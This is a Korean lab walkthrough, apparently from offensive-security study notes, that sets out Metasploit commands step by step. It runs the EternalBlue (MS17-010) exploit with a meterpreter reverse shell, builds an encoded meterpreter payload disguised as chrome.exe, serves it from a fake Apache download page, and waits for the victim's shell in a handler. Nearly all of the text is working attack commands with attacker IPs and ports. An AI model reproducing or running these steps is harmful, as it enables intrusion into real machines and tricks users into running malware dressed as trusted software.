## 1. 준비
```bash
msfconsole
search type:auxiliary ms17-010
search type:exploit ms17-010
use exploit/windows/smb/ms17_010_eternalblue
set payload windows/x64/meterpreter/reverse_tcp
set rhosts 10.0.0.31          # show options으로 확인
set LHOST 10.0.0.41           # 공격자 IP
set LPORT 4444                # 공격자 포트
run
```

### 1.4 악성파일 배포 및 리버스쉘
**환경 정보**
```
공격자 (Kali) : 10.0.0.41
리스너 포트   : 60020
```

**1. 악성 exe 생성**
```bash
# 인코더 목록 확인
msfvenom -l encoders

# chrome.exe 생성 (x64/zutto_dekiru 인코더, 3회 반복)
msfvenom -a x64 --platform windows -p windows/x64/meterpreter/reverse_tcp \
LHOST=10.0.0.41 LPORT=60020 -f exe -e x64/zutto_dekiru -i 3 -o /root/chrome.exe
```

**2. 아파치로 파일 배포**
```bash
# 기존 index.html 백업
mv /var/www/html/index.html /var/www/html/index.html.bak

# 다운로드 페이지 생성
cat > /var/www/html/index.html << 'EOF'
<html>
<body>
<h1>sgm-install-file</h1>
<a href="http://10.0.0.41/chrome.exe">크롬다운로드</a>
</body>
</html>
EOF

# chrome.exe 웹 디렉토리에 복사
cp /root/chrome.exe /var/www/html/

# 아파치 실행
systemctl start apache2
```

**3. 리스너 대기**
```bash
msfconsole
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 10.0.0.41
set LPORT 60020
run
# 타겟이 chrome.exe 실행하면 meterpreter 세션 열림
```
